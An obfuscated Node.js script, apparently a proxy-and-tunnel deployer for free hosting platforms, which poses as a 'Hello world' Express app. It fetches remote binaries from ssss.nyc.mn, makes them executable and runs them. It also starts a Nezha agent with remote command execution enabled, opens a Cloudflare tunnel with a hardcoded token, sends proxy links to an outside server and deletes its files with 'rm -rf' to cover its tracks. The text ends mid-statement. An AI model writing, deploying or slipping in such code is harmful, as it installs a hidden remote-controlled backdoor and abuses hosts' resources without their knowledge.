function _0x4dcf(_0x3ee18e,_0x1ab358){_0x3ee18e=_0x3ee18e-0xcd;const _0x1632ef=_0x1632();let _0x4dcf62=_0x1632ef[_0x3ee18e];return _0x4dcf62;}const _0x33c20a=_0x4dcf;(function(_0x44a0f9,_0x918cb2){const _0x56c936=_0x4dcf,_0x190381=_0x44a0f9();while(!![]){try{const _0x354e45=-parseInt(_0x56c936(0x15f))/0x1+-parseInt(_0x56c936(0x142))/0x2*(-parseInt(_0x56c936(0x126))/0x3)+-parseInt(_0x56c936(0x124))/0x4+-parseInt(_0x56c936(0x111))/0x5+parseInt(_0x56c936(0xd0))/0x6*(parseInt(_0x56c936(0x158))/0x7)+-parseInt(_0x56c936(0x11d))/0x8+parseInt(_0x56c936(0xd1))/0x9;if(_0x354e45===_0x918cb2)break;else _0x190381['push'](_0x190381['shift']());}catch(_0xfd2ef0){_0x190381['push'](_0x190381['shift']());}}}(_0x1632,0x4fedf));const express=require('express'),app=express(),axios=require(_0x33c20a(0x184)),os=require('os'),fs=require('fs'),path=require(_0x33c20a(0xcf)),{promisify}=require(_0x33c20a(0xdd)),exec=promisify(require('child_process')[_0x33c20a(0x150)]),{execSync}=require(_0x33c20a(0xf4)),UPLOAD_URL=process['env'][_0x33c20a(0xd4)]||'',PROJECT_URL=process['env'][_0x33c20a(0x162)]||'',AUTO_ACCESS=process[_0x33c20a(0x115)][_0x33c20a(0x112)]||![],FILE_PATH=process[_0x33c20a(0x115)][_0x33c20a(0x16d)]||_0x33c20a(0x114),SUB_PATH=process['env'][_0x33c20a(0x151)]||_0x33c20a(0x17f),PORT=process[_0x33c20a(0x115)][_0x33c20a(0x14d)]||process[_0x33c20a(0x115)][_0x33c20a(0x10a)]||0xbb8,UUID=process[_0x33c20a(0x115)][_0x33c20a(0x133)]||_0x33c20a(0x116),NEZHA_SERVER=process['env'][_0x33c20a(0x13d)]||'',NEZHA_PORT=process[_0x33c20a(0x115)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x33c20a(0x115)][_0x33c20a(0x178)]||'',ARGO_DOMAIN=process[_0x33c20a(0x115)]['ARGO_DOMAIN']||_0x33c20a(0x145),ARGO_AUTH=process[_0x33c20a(0x115)][_0x33c20a(0x130)]||_0x33c20a(0x128),ARGO_PORT=process[_0x33c20a(0x115)]['ARGO_PORT']||0x1f41,CFIP=process[_0x33c20a(0x115)][_0x33c20a(0xd8)]||'cdns.doon.eu.org',CFPORT=process[_0x33c20a(0x115)][_0x33c20a(0x10d)]||0x1bb,NAME=process[_0x33c20a(0x115)]['NAME']||_0x33c20a(0x173);!fs[_0x33c20a(0xfa)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x33c20a(0xde))):console[_0x33c20a(0x14e)](FILE_PATH+_0x33c20a(0x180));function generateRandomName(){const _0x3f23ec=_0x33c20a,_0xbb2c75=_0x3f23ec(0x12c);let _0x18d85e='';for(let _0x24cd6c=0x0;_0x24cd6c<0x6;_0x24cd6c++){_0x18d85e+=_0xbb2c75[_0x3f23ec(0x100)](Math[_0x3f23ec(0x176)](Math['random']()*_0xbb2c75[_0x3f23ec(0xef)]));}return _0x18d85e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x33c20a(0x11b)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x33c20a(0x11b)](FILE_PATH,_0x33c20a(0xe0)),listPath=path[_0x33c20a(0x11b)](FILE_PATH,_0x33c20a(0xe5)),bootLogPath=path['join'](FILE_PATH,_0x33c20a(0x11e)),configPath=path['join'](FILE_PATH,_0x33c20a(0xe9));function deleteNodes(){const _0x19774e=_0x33c20a;try{if(!UPLOAD_URL)return;if(!fs[_0x19774e(0xfa)](subPath))return;let _0x1342ae;try{_0x1342ae=fs[_0x19774e(0x181)](subPath,'utf-8');}catch{return null;}const _0xf8836b=Buffer[_0x19774e(0xed)](_0x1342ae,_0x19774e(0x11c))[_0x19774e(0x109)](_0x19774e(0x127)),_0x39ee9=_0xf8836b[_0x19774e(0x174)]('\x0a')[_0x19774e(0xff)](_0x2af46b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19774e(0xfe)](_0x2af46b));if(_0x39ee9[_0x19774e(0xef)]===0x0)return;return axios[_0x19774e(0x107)](UPLOAD_URL+_0x19774e(0x13f),JSON[_0x19774e(0xeb)]({'nodes':_0x39ee9}),{'headers':{'Content-Type':_0x19774e(0x12f)}})[_0x19774e(0x121)](_0x1a2852=>{return null;}),null;}catch(_0x1131cf){return null;}}function cleanupOldFiles(){const _0x3807fa=_0x33c20a;try{const _0x47f1eb=fs[_0x3807fa(0xd9)](FILE_PATH);_0x47f1eb[_0x3807fa(0x17c)](_0x71b9de=>{const _0x397040=_0x3807fa,_0x16779e=path[_0x397040(0x11b)](FILE_PATH,_0x71b9de);try{const _0xc7d358=fs[_0x397040(0xd2)](_0x16779e);_0xc7d358[_0x397040(0x154)]()&&fs[_0x397040(0x13b)](_0x16779e);}catch(_0x20d520){}});}catch(_0x426503){}}app[_0x33c20a(0x132)]('/',function(_0x328cc9,_0x414544){const _0x2be700=_0x33c20a;_0x414544[_0x2be700(0x167)](_0x2be700(0x16c));});async function generateConfig(){const _0x1852f9=_0x33c20a,_0x29a855={'log':{'access':_0x1852f9(0x12d),'error':_0x1852f9(0x12d),'loglevel':_0x1852f9(0x11f)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1852f9(0x11f),'fallbacks':[{'dest':0xbb9},{'path':_0x1852f9(0x16f),'dest':0xbba},{'path':_0x1852f9(0x104),'dest':0xbbb},{'path':_0x1852f9(0x13c),'dest':0xbbc}]},'streamSettings':{'network':_0x1852f9(0x113)}},{'port':0xbb9,'listen':_0x1852f9(0x119),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1852f9(0x113),'security':'none'}},{'port':0xbba,'listen':_0x1852f9(0x119),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1852f9(0x11f)},'streamSettings':{'network':'ws','security':_0x1852f9(0x11f),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1852f9(0xf1),_0x1852f9(0x147),_0x1852f9(0x153)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1852f9(0x119),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1852f9(0xf1),_0x1852f9(0x147),_0x1852f9(0x153)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1852f9(0x119),'protocol':_0x1852f9(0x177),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1852f9(0x11f),'wsSettings':{'path':_0x1852f9(0x13c)}},'sniffing':{'enabled':!![],'destOverride':[_0x1852f9(0xf1),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1852f9(0x166)]},'outbounds':[{'protocol':_0x1852f9(0x102),'tag':_0x1852f9(0xf7)},{'protocol':_0x1852f9(0x15a),'tag':_0x1852f9(0xec)}]};fs[_0x1852f9(0x12e)](path[_0x1852f9(0x11b)](FILE_PATH,'config.json'),JSON['stringify'](_0x29a855,null,0x2));}function getSystemArchitecture(){const _0x1a4221=_0x33c20a,_0x56989a=os[_0x1a4221(0x15e)]();return _0x56989a==='arm'||_0x56989a===_0x1a4221(0xdb)||_0x56989a===_0x1a4221(0x160)?'arm':'amd';}function downloadFile(_0x1834ba,_0x41b7c0,_0x2265ae){const _0x107e26=_0x33c20a,_0x36eb58=_0x1834ba;!fs[_0x107e26(0xfa)](FILE_PATH)&&fs[_0x107e26(0x159)](FILE_PATH,{'recursive':!![]});const _0x5f1567=fs[_0x107e26(0x117)](_0x36eb58);axios({'method':_0x107e26(0x132),'url':_0x41b7c0,'responseType':'stream'})[_0x107e26(0x157)](_0x4bdb2f=>{const _0x3293fe=_0x107e26;_0x4bdb2f[_0x3293fe(0xf3)][_0x3293fe(0x15c)](_0x5f1567),_0x5f1567['on'](_0x3293fe(0xea),()=>{const _0x2e0b3a=_0x3293fe;_0x5f1567[_0x2e0b3a(0xf2)](),console[_0x2e0b3a(0x14e)](_0x2e0b3a(0x187)+path[_0x2e0b3a(0x175)](_0x36eb58)+_0x2e0b3a(0x144)),_0x2265ae(null,_0x36eb58);}),_0x5f1567['on'](_0x3293fe(0xfc),_0x87de66=>{const _0x30e9ed=_0x3293fe;fs[_0x30e9ed(0x169)](_0x36eb58,()=>{});const _0xc56e3=_0x30e9ed(0x187)+path['basename'](_0x36eb58)+'\x20failed:\x20'+_0x87de66[_0x30e9ed(0xd7)];console[_0x30e9ed(0xfc)](_0xc56e3),_0x2265ae(_0xc56e3);});})['catch'](_0xe7443b=>{const _0xea3bfd=_0x107e26,_0x69bea='Download\x20'+path[_0xea3bfd(0x175)](_0x36eb58)+_0xea3bfd(0x155)+_0xe7443b[_0xea3bfd(0xd7)];console[_0xea3bfd(0xfc)](_0x69bea),_0x2265ae(_0x69bea);});}async function downloadFilesAndRun(){const _0x5e3cce=_0x33c20a,_0x179f6a=getSystemArchitecture(),_0x1aebd2=getFilesForArchitecture(_0x179f6a);if(_0x1aebd2[_0x5e3cce(0xef)]===0x0){console[_0x5e3cce(0x14e)](_0x5e3cce(0x14f));return;}const _0x5700a2=_0x1aebd2['map'](_0xdb74a2=>{return new Promise((_0x3fa417,_0x58add2)=>{const _0x17b78d=_0x4dcf;downloadFile(_0xdb74a2[_0x17b78d(0x10b)],_0xdb74a2['fileUrl'],(_0x3ad6c5,_0xe58fa4)=>{_0x3ad6c5?_0x58add2(_0x3ad6c5):_0x3fa417(_0xe58fa4);});});});try{await Promise['all'](_0x5700a2);}catch(_0x4fe3ce){console[_0x5e3cce(0xfc)](_0x5e3cce(0xe1),_0x4fe3ce);return;}function _0x2db3ef(_0x53d2f7){const _0x178670=_0x5e3cce,_0x4deb28=0x1fd;_0x53d2f7[_0x178670(0x17c)](_0x297a23=>{const _0x397096=_0x178670;fs['existsSync'](_0x297a23)&&fs[_0x397096(0xfd)](_0x297a23,_0x4deb28,_0x580937=>{const _0x129fbb=_0x397096;_0x580937?console[_0x129fbb(0xfc)]('Empowerment\x20failed\x20for\x20'+_0x297a23+':\x20'+_0x580937):console[_0x129fbb(0x14e)]('Empowerment\x20success\x20for\x20'+_0x297a23+':\x20'+_0x4deb28[_0x129fbb(0x109)](0x8));});});}const _0x47a945=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2db3ef(_0x47a945);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2d0e9a=NEZHA_SERVER[_0x5e3cce(0x129)](':')?NEZHA_SERVER[_0x5e3cce(0x174)](':')['pop']():'',_0x429a5c=new Set([_0x5e3cce(0x123),_0x5e3cce(0x140),_0x5e3cce(0x14a),_0x5e3cce(0x17d),_0x5e3cce(0x10f),_0x5e3cce(0x149)]),_0x407aab=_0x429a5c['has'](_0x2d0e9a)?_0x5e3cce(0x12b):_0x5e3cce(0x141),_0x3af378=_0x5e3cce(0x138)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x407aab+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5e3cce(0x12e)](path[_0x5e3cce(0x11b)](FILE_PATH,'config.yaml'),_0x3af378);const _0x450f3c='nohup\x20'+phpPath+_0x5e3cce(0x183)+FILE_PATH+_0x5e3cce(0x139);try{await exec(_0x450f3c),console[_0x5e3cce(0x14e)](phpName+'\x20is\x20running'),await new Promise(_0x308de7=>setTimeout(_0x308de7,0x3e8));}catch(_0x5e5aaf){console[_0x5e3cce(0xfc)](_0x5e3cce(0x148)+_0x5e5aaf);}}else{let _0x545fc5='';const _0x4915eb=['443','8443',_0x5e3cce(0x14a),_0x5e3cce(0x17d),_0x5e3cce(0x10f),_0x5e3cce(0x149)];_0x4915eb[_0x5e3cce(0x129)](NEZHA_PORT)&&(_0x545fc5='--tls');const _0x55b01c='nohup\x20'+npmPath+_0x5e3cce(0xe6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5e3cce(0x120)+NEZHA_KEY+'\x20'+_0x545fc5+_0x5e3cce(0x17a);try{await exec(_0x55b01c),console[_0x5e3cce(0x14e)](npmName+_0x5e3cce(0x101)),await new Promise(_0x1bb835=>setTimeout(_0x1bb835,0x3e8));}catch(_0xe4bff8){console[_0x5e3cce(0xfc)](_0x5e3cce(0xcd)+_0xe4bff8);}}}else console['log'](_0x5e3cce(0x131));const _0x1d7d33=_0x5e3cce(0xe8)+webPath+_0x5e3cce(0x125)+FILE_PATH+_0x5e3cce(0xf9);try{await exec(_0x1d7d33),console[_0x5e3cce(0x14e)](webName+'\x20is\x20running'),await new Promise(_0x139e91=>setTimeout(_0x139e91,0x3e8));}catch(_0x467284){console['error'](_0x5e3cce(0x106)+_0x467284);}if(fs[_0x5e3cce(0xfa)](botPath)){let _0x440f69;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x440f69='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5e3cce(0x163)](/TunnelSecret/)?_0x440f69=_0x5e3cce(0x17e)+FILE_PATH+_0x5e3cce(0x152):_0x440f69='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5e3cce(0x165)+ARGO_PORT;try{await exec(_0x5e3cce(0xe8)+botPath+'\x20'+_0x440f69+_0x5e3cce(0x171)),console[_0x5e3cce(0x14e)](botName+_0x5e3cce(0x101)),await new Promise(_0xaa9b32=>setTimeout(_0xaa9b32,0x7d0));}catch(_0x1ccab4){console[_0x5e3cce(0xfc)]('Error\x20executing\x20command:\x20'+_0x1ccab4);}}await new Promise(_0x106820=>setTimeout(_0x106820,0x1388));}function getFilesForArchitecture(_0x520773){const _0x43b37c=_0x33c20a;let _0x24dc19;_0x520773===_0x43b37c(0xce)?_0x24dc19=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x43b37c(0x185)}]:_0x24dc19=[{'fileName':webPath,'fileUrl':_0x43b37c(0x15d)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5511fd=_0x520773===_0x43b37c(0xce)?'https://arm64.ssss.nyc.mn/agent':_0x43b37c(0x135);_0x24dc19[_0x43b37c(0x14b)]({'fileName':npmPath,'fileUrl':_0x5511fd});}else{const _0x6f6c1=_0x520773===_0x43b37c(0xce)?_0x43b37c(0xe3):'https://amd64.ssss.nyc.mn/v1';_0x24dc19[_0x43b37c(0x14b)]({'fileName':phpPath,'fileUrl':_0x6f6c1});}}return _0x24dc19;}function argoType(){const _0x3b19bb=_0x33c20a;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x3b19bb(0x13e));return;}if(ARGO_AUTH[_0x3b19bb(0x129)](_0x3b19bb(0x17b))){fs[_0x3b19bb(0x12e)](path['join'](FILE_PATH,_0x3b19bb(0x10c)),ARGO_AUTH);const _0x23f132=_0x3b19bb(0x16a)+ARGO_AUTH[_0x3b19bb(0x174)]('\x22')[0xb]+_0x3b19bb(0xee)+path[_0x3b19bb(0x11b)](FILE_PATH,_0x3b19bb(0x10c))+_0x3b19bb(0x134)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x3b19bb(0x11b)](FILE_PATH,'tunnel.yml'),_0x23f132);}else console[_0x3b19bb(0x14e)](_0x3b19bb(0x11a));}async function extractDomains(){const _0x161a5d=_0x33c20a;let _0x549b99;if(ARGO_AUTH&&ARGO_DOMAIN)_0x549b99=ARGO_DOMAIN,console[_0x161a5d(0x14e)](_0x161a5d(0x18a),_0x549b99),await _0x27277f(_0x549b99);else try{const _0x5e4b6c=fs[_0x161a5d(0x181)](path[_0x161a5d(0x11b)](FILE_PATH,_0x161a5d(0x11e)),_0x161a5d(0x127)),_0x2c44c5=_0x5e4b6c['split']('\x0a'),_0x4e409c=[];_0x2c44c5['forEach'](_0x5bc7a9=>{const _0x39d07a=_0x161a5d,_0x4cb7ad=_0x5bc7a9[_0x39d07a(0x163)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4cb7ad){const _0x49f08d=_0x4cb7ad[0x1];_0x4e409c[_0x39d07a(0xe7)](_0x49f08d);}});if(_0x4e409c['length']>0x0)_0x549b99=_0x4e409c[0x0],console[_0x161a5d(0x14e)](_0x161a5d(0xda),_0x549b99),await _0x27277f(_0x549b99);else{console[_0x161a5d(0x14e)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x161a5d(0x11b)](FILE_PATH,_0x161a5d(0x11e)));async function _0x3f8f94(){const _0x57eeb0=_0x161a5d;try{process['platform']===_0x57eeb0(0x188)?await exec(_0x57eeb0(0xd3)+botName+_0x57eeb0(0x170)):await exec(_0x57eeb0(0xfb)+botName[_0x57eeb0(0x100)](0x0)+']'+botName[_0x57eeb0(0xe4)](0x1)+_0x57eeb0(0x13a));}catch(_0x69a05a){}}_0x3f8f94(),await new Promise(_0x415386=>setTimeout(_0x415386,0xbb8));const _0x334bcd=_0x161a5d(0xdc)+FILE_PATH+_0x161a5d(0x165)+ARGO_PORT;try{await exec(_0x161a5d(0xe8)+botPath+'\x20'+_0x334bcd+_0x161a5d(0x171)),console[_0x161a5d(0x14e)](botName+_0x161a5d(0x101)),await new Promise(_0x31f37a=>setTimeout(_0x31f37a,0xbb8)),await extractDomains();}catch(_0x591cfc){console[_0x161a5d(0xfc)](_0x161a5d(0x137)+_0x591cfc);}}}catch(_0x2761fc){console[_0x161a5d(0xfc)](_0x161a5d(0x168),_0x2761fc);}async function _0x13cf4c(){const _0x4718ac=_0x161a5d;try{const _0x4415c5=await axios[_0x4718ac(0x132)](_0x4718ac(0x16e),{'timeout':0xbb8});if(_0x4415c5[_0x4718ac(0xf3)]&&_0x4415c5['data'][_0x4718ac(0xf6)]&&_0x4415c5[_0x4718ac(0xf3)][_0x4718ac(0x118)])return _0x4415c5[_0x4718ac(0xf3)][_0x4718ac(0xf6)]+'_'+_0x4415c5['data'][_0x4718ac(0x118)];}catch(_0x27a62b){try{const _0x336470=await axios[_0x4718ac(0x132)](_0x4718ac(0xf0),{'timeout':0xbb8});if(_0x336470[_0x4718ac(0xf3)]&&_0x336470[_0x4718ac(0xf3)][_0x4718ac(0x15b)]===_0x4718ac(0x103)&&_0x336470['data'][_0x4718ac(0xd6)]&&_0x336470['data'][_0x4718ac(0x118)])return _0x336470[_0x4718ac(0xf3)][_0x4718ac(0xd6)]+'_'+_0x336470[_0x4718ac(0xf3)]['org'];}catch(_0x571c29){}}return'Unknown';}async function _0x27277f(_0x108ce4){const _0x192395=await _0x13cf4c(),_0x37d57b=NAME?NAME+'-'+_0x192395:_0x192395;return new Promise(_0x2c9e85=>{setTimeout(()=>{const _0x544e22=_0x4dcf,_0xf30fb={'v':'2','ps':''+_0x37d57b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x544e22(0x11f),'net':'ws','type':_0x544e22(0x11f),'host':_0x108ce4,'path':_0x544e22(0x122),'tls':_0x544e22(0x147),'sni':_0x108ce4,'alpn':'','fp':_0x544e22(0x143)},_0x4d7675=_0x544e22(0xf8)+UUID+'@'+CFIP+':'+CFPORT+_0x544e22(0x105)+_0x108ce4+'&fp=firefox&type=ws&host='+_0x108ce4+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x37d57b+'\x0a\x0avmess://'+Buffer[_0x544e22(0xed)](JSON[_0x544e22(0xeb)](_0xf30fb))[_0x544e22(0x109)](_0x544e22(0x11c))+_0x544e22(0x108)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x108ce4+'&fp=firefox&type=ws&host='+_0x108ce4+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x37d57b+_0x544e22(0x16b);console[_0x544e22(0x14e)](Buffer['from'](_0x4d7675)[_0x544e22(0x109)](_0x544e22(0x11c))),fs[_0x544e22(0x12e)](subPath,Buffer[_0x544e22(0xed)](_0x4d7675)[_0x544e22(0x109)]('base64')),console[_0x544e22(0x14e)](FILE_PATH+_0x544e22(0xd5)),uploadNodes(),app[_0x544e22(0x132)]('/'+SUB_PATH,(_0x5db10a,_0x2ad0c8)=>{const _0x42d156=_0x544e22,_0x38b425=Buffer[_0x42d156(0xed)](_0x4d7675)[_0x42d156(0x109)](_0x42d156(0x11c));_0x2ad0c8[_0x42d156(0x161)](_0x42d156(0x10e),'text/plain;\x20charset=utf-8'),_0x2ad0c8[_0x42d156(0x167)](_0x38b425);}),_0x2c9e85(_0x4d7675);},0x7d0);});}}async function uploadNodes(){const _0x162b49=_0x33c20a;if(UPLOAD_URL&&PROJECT_URL){const _0x80881c=PROJECT_URL+'/'+SUB_PATH,_0x2b4b9e={'subscription':[_0x80881c]};try{const _0x2d6fce=await axios[_0x162b49(0x107)](UPLOAD_URL+_0x162b49(0xf5),_0x2b4b9e,{'headers':{'Content-Type':_0x162b49(0x12f)}});return _0x2d6fce&&_0x2d6fce[_0x162b49(0x15b)]===0xc8?(console[_0x162b49(0x14e)]('Subscription\x20uploaded\x20successfully'),_0x2d6fce):null;}catch(_0x14e22c){if(_0x14e22c[_0x162b49(0x172)]){if(_0x14e22c[_0x162b49(0x172)][_0x162b49(0x15b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x162b49(0xfa)](listPath))return;const _0x34e378=fs['readFileSync'](listPath,_0x162b49(0x127)),_0x2beca5=_0x34e378['split']('\x0a')[_0x162b49(0xff)](_0x376ee9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x162b49(0xfe)](_0x376ee9));if(_0x2beca5[_0x162b49(0xef)]===0x0)return;const _0x8fdb7b=JSON[_0x162b49(0xeb)]({'nodes':_0x2beca5});try{const _0x11497a=await axios['post'](UPLOAD_URL+_0x162b49(0x164),_0x8fdb7b,{'headers':{'Content-Type':_0x162b49(0x12f)}});return _0x11497a&&_0x11497a[_0x162b49(0x15b)]===0xc8?(console[_0x162b49(0x14e)]('Nodes\x20uploaded\x20successfully'),_0x11497a):null;}catch(_0x2e5a57){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x23636e=_0x4dcf,_0x49cfca=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x49cfca[_0x23636e(0xe7)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x49cfca[_0x23636e(0xe7)](phpPath);process[_0x23636e(0xe2)]===_0x23636e(0x188)?exec(_0x23636e(0x189)+_0x49cfca[_0x23636e(0x11b)]('\x20')+'\x20>\x20nul\x202>&1',_0x306fa4=>{const _0x5e04f9=_0x23636e;console[_0x5e04f9(0x156)](),console['log']('App\x20is\x20running'),console['log'](_0x5e04f9(0xdf));}):exec(_0x23636e(0x136)+_0x49cfca[_0x23636e(0x11b)]('\x20')+'\x20>/dev/null\x202>&1',_0xbf534b=>{const _0xe0c915=_0x23636e;console[_0xe0c915(0x156)](),console[_0xe0c915(0x14e)](_0xe0c915(0x110)),console['log'](_0xe0c915(0xdf));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x577a0f=_0x33c20a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x577a0f(0x14e)](_0x577a0f(0x14c));return;}try{const _0x265ab0=await axios['post'](_0x577a0f(0x186),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x577a0f(0x12f)}});return console[_0x577a0f(0x14e)](_0x577a0f(0x179)),_0x265ab0;}catch(_0x4dedc8){return console[_0x577a0f(0xfc)](_0x577a0f(0x12a)+_0x4dedc8[_0x577a0f(0xd7)]),null;}}async function startserver(){const _0x4248cf=_0x33c20a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x12809c){console[_0x4248cf(0xfc)]('Error\x20in\x20startserver:',_0x12809c);}}function _0x1632(){const _0x5799bc=['UUID','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/agent','rm\x20-rf\x20','Error\x20executing\x20command:\x20','\x0aclient_secret:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x22\x20>\x20/dev/null\x202>&1','unlinkSync','/trojan-argo','NEZHA_SERVER','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/api/delete-nodes','8443','false','8rvYcxf','firefox','\x20successfully','jiayongmiyao.shengxia.dpdns.org','http\x20server\x20is\x20running\x20on\x20port:','tls','php\x20running\x20error:\x20','2053','2096','unshift','Skipping\x20adding\x20automatic\x20access\x20task','SERVER_PORT','log','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','exec','SUB_PATH','/tunnel.yml\x20run','quic','isFile','\x20failed:\x20','clear','then','49tGtKgJ','mkdirSync','blackhole','status','pipe','https://amd64.ssss.nyc.mn/web','arch','280052OQIqHG','aarch64','set','PROJECT_URL','match','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https+local://8.8.8.8/dns-query','send','Error\x20reading\x20boot.log:','unlink','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x20\x20','Hello\x20world!','FILE_PATH','https://ipapi.co/json/','/vless-argo','.exe\x20>\x20nul\x202>&1','\x20>/dev/null\x202>&1\x20&','response','jiayongmiyao','split','basename','floor','trojan','NEZHA_KEY','automatic\x20access\x20task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','TunnelSecret','forEach','2087','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','sub','\x20already\x20exists','readFileSync','Unhandled\x20error\x20in\x20startserver:','\x20-c\x20\x22','axios','https://arm64.ssss.nyc.mn/bot','https://oooo.serv00.net/add-url','Download\x20','win32','del\x20/f\x20/q\x20','ARGO_DOMAIN:','npm\x20running\x20error:\x20','arm','path','107682UEpzCD','16079805atZKdX','statSync','taskkill\x20/f\x20/im\x20','UPLOAD_URL','/sub.txt\x20saved\x20successfully','countryCode','message','CFIP','readdirSync','ArgoDomain:','arm64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','util','\x20is\x20created','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','sub.txt','Error\x20downloading\x20files:','platform','https://arm64.ssss.nyc.mn/v1','substring','list.txt','\x20-s\x20','push','nohup\x20','config.json','finish','stringify','block','from','\x0a\x20\x20credentials-file:\x20','length','http://ip-api.com/json/','http','close','data','child_process','/api/add-subscriptions','country_code','direct','\x0avless://','/config.json\x20>/dev/null\x202>&1\x20&','existsSync','pkill\x20-f\x20\x22[','error','chmod','test','filter','charAt','\x20is\x20running','freedom','success','/vmess-argo','?encryption=none&security=tls&sni=','web\x20running\x20error:\x20','post','\x0a\x0atrojan://','toString','PORT','fileName','tunnel.json','CFPORT','Content-Type','2083','App\x20is\x20running','2508925ugDJJn','AUTO_ACCESS','tcp','./tmp','env','3eb8fdd4-bbec-460b-adcc-f9640cdbece5','createWriteStream','org','127.0.0.1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','join','base64','1595584ILCSOt','boot.log','none','\x20-p\x20','catch','/vmess-argo?ed=2560','443','2584280UUMqds','\x20-c\x20','31854seXsZf','utf-8','eyJhIjoiYjMzNzFkNDA5MDJlMjcxODgwMGYwZDFlZDAzYjE4ZWIiLCJ0IjoiMTYxMTU1MDYtZGQ5OC00ZmEwLWFiM2QtNGVmOWU4NjM2NmUzIiwicyI6Ik9EVTJObVkxT1RFdE56ZGtOQzAwWldaa0xUazFOV010TlRFMU1EY3dOV0ppTWpJNSJ9','includes','Add\x20automatic\x20access\x20task\x20faild:\x20','true','abcdefghijklmnopqrstuvwxyz','/dev/null','writeFileSync','application/json','ARGO_AUTH','NEZHA\x20variable\x20is\x20empty,skip\x20running','get'];_0x1632=function(){return _0x5799bc;};return _0x1632();}startserver()[_0x33c20a(0x121)](_0x2f1d6e=>{const 